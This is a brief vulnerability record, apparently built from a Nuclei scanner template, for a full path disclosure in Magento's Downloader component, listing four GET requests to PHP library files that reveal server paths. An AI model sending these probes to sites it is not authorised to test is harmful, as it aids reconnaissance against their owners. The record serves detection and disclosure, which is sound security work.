# Vulnerability: Magento Downloader - Full Path Disclosure
**Classification:** CWE-200
**Source:** Nuclei Template (`magento-downloader-fpd.yaml`)

## Description
Detected Magento Downloader component exposed internal file system paths through direct file access.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/downloader/lib/Mage/Backup/Nomedia.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Tar.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Gz.php
GET {{BaseURL}}/downloader/lib/Mage/Archive/Bz.php
```

